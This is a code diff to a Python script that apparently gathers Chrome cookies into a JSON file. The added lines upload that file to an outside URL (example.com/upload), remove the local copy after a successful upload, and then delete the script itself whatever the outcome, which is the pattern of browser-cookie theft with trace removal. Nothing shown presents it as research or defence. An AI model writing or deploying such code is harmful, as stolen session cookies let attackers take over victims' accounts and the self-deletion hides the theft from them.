@@ -36,4 +36,21 @@ file_path = 'chrome_cookies_with_metadata.json'
 with open(file_path, 'w') as f:
     json.dump(cookies_with_metadata, f, indent=2)
 
+# Send the file via URL
+url = 'https://example.com/upload'
+files = {'file': open(file_path, 'rb')}
+response = requests.post(url, files=files)
 
+# Check if the file was successfully uploaded
+if response.status_code == 200:
+    print("File uploaded successfully!")
+    # Delete the file after sending
+    os.remove(file_path)
+    print("File deleted successfully!")
+else:
+    print("Failed to upload the file.")
+
+# Self-delete the script file (THIS WILL DELETE THE SCRIPT REGARDLESS IF IT SENT THE FILE OR NOT)
+script_path = os.path.abspath(__file__)
+os.remove(script_path)
+print("Script self-deleted successfully!")
